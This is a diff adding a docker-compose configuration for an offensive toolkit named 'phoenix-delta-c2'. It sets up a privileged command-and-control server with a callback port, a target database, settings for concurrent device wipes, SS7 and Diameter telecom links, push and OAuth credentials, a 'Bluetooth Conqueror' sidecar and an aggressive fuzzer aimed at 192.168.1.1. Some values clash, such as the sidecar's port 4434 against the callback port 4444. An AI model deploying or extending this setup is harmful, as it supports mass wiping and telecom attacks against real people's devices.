@@ -1,0 +1,84 @@
+version: '3.8'
+
+services:
+  phoenix-c2:
+    build: .
+    container_name: phoenix-delta-c2
+    network_mode: host
+    privileged: true
+    volumes:
+      - ./payloads:/app/payloads
+      - ./db:/app/db
+      - ./configs:/app/configs
+      - ./certs:/app/certs
+    environment:
+      - C2_HOST=0.0.0.0
+      - C2_PORT=443
+      - C2_CALLBACK_PORT=4444
+      - C2_SSL=false
+      - PHOENIX_DB=/app/db/targets.db
+      - LOG_LEVEL=INFO
+      - MAX_CONCURRENT_WIPES=10
+      - WIPE_COOLDOWN=0.5
+      - AI_FUZZER=true
+      - FUZZER_AGGRESSIVE=9000
+      - SS7_HOST=127.0.0.1
+      - SS7_PORT=2905
+      - SS7_GT=1234567890
+      - DIAMETER_HOST=127.0.0.1
+      - DIAMETER_PORT=3868
+      - GOOGLE_OAUTH=${GOOGLE_OAUTH:-}
+      - APNS_KEY=${APNS_KEY:-/run/secrets/apns_key}
+      - HUAWEI_API_KEY=${HUAWEI_API_KEY:-}
+    secrets:
+      - apns_key
+      - google_oauth
+    restart: always
+    deploy:
+      resources:
+        limits:
+          memory: 4G
+          cpus: "4"
+
+  # Optional: Bluetooth Conqueror as sidecar
+  bt-conqueror:
+    build:
+      context: .
+      dockerfile: Dockerfile.bluetooth
+    container_name: phoenix-bt-conqueror
+    network_mode: host
+    privileged: true
+    volumes:
+      - ./db:/app/db
+    environment:
+      - C2_SERVER=phoenix-c2:4434
+    depends_on:
+      - phoenix-c2
+    restart: always
+    profiles:
+      - bluetooth
+
+  # Optional: AI Fuzzer worker
+  ai-fuzzer:
+    build: .
+    container_name: phoenix-ai-fuzzer
+    command: ["python3", "-m", "ai_fuzzer.fuzzer", "--target-ip", "192.168.1.1", "--deep-scan", "--aggressive-level", "9000"]
+    network_mode: host
+    privileged: true
+    volumes:
+      - ./db:/app/db
+    depends_on:
+      - phoenix-c2
+    restart: "no"
+    profiles:
+      - fuzzer
+
+secrets:
+  apns_key:
+    file: ./certs/apns_key.p8
+  google_oauth:
+    file: ./certs/google_oauth.json
+
+networks:
+  default:
+    name: phoenix-delta-net
